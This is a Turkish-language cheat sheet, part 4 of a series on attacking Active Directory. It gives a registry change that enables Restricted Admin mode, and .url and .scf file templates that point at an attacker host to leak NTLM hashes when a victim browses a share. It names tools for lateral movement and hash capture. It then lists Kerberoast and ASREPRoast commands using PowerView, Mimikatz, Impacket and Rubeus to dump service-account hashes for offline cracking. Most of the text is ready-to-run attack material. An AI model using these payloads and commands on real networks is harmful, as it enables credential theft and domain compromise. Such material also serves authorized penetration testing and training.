# Active Directory Exploitation Cheat Sheet - Bölüm 4

- **Restricted Admin Modunu Etkinleştirme:**  
  Eğer uzak makinede Restricted Admin modu devre dışıysa, aşağıdaki kayıt anahtarını oluşturarak etkinleştirebilirsiniz:
  ```powershell
  New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType DWORD
  ```

## URL Dosya Saldırıları

### .url Dosyası
```plaintext
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<AttackersIp>\%USERNAME%.icon
IconIndex=1

[InternetShortcut]
URL=file://<AttackersIp>/leak/leak.html
```

### .scf Dosyası
```plaintext
[Shell]
Command=2
IconFile=\\<AttackersIp>\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

- **Not:** Bu dosyalar yazılabilir bir paylaşımda bırakıldığında, kurban yalnızca dosya gezgini ile paylaşıma göz atmalı ve dosya açılmasa bile hash yakalama işlemi gerçekleşebilir.
- **Dikkat:** .scf dosya saldırıları Windows'un en son sürümlerinde çalışmaz.
- **Hash Yakalama İçin Araç:** Responder kullanabilirsiniz.

## Faydalı Araçlar

- **Powercat:** PowerShell ile yazılmış bir netcat. Tünelleme, aktarma ve port yönlendirme özellikleri sağlar.
- **SCShell:** Fileless lateral movement aracı, ChangeServiceConfigA'ya dayanır.
- **Evil-Winrm:** WinRM shell aracı.
- **RunasCs:** Windows'un dahili `runas.exe` aracının açık kaynaklı bir versiyonu.
- **ntlm_theft:** URL dosya saldırıları için gerekli tüm dosya formatlarını oluşturur.

## Domain Yetki Yükseltme

### Kerberoast

- **Nedir?:** Standart bir domain kullanıcısı, tüm servis hesaplarının şifre hash'lerini içeren bir kopyasını talep edebilir. Bu hash'ler çevrimdışı brute-force ile kırılabilir.

#### PowerView Kullanımı:
```powershell
# Servis Hesabı Olarak Kullanılan Kullanıcı Hesaplarını Al
Get-NetUser -SPN
# Tüm SPN hesaplarını al, TGS iste ve hash'lerini dump et
Invoke-Kerberoast
# Belirli bir hesap için TGS iste
Request-SPNTicket
# Tüm biletleri dışa aktar
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### AD Modülü Kullanımı:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Impacket Kullanımı:
```bash
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```

#### Rubeus Kullanımı:
```bash
# Tüm SPN hesaplarını kerberoast formatında dump et
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
# AES etkin hesaplar dışında kerberoast yap
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
# AES etkin hesapları kerberoast yap
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
# Belirli bir kullanıcı hesabını kerberoast yap
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
# Kimlik bilgileri belirterek kerberoast yap
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
```

### ASREPRoast

- **Nedir?:** Eğer bir domain kullanıcı hesabı Kerberos preauthentication gerektirmiyorsa, geçerli bir TGT isteyebilir ve şifre hash'ini brute-force ile çevrimdışı kırabilirsiniz.

#### PowerView Kullanımı:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

#### AD Modülü Kullanımı:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
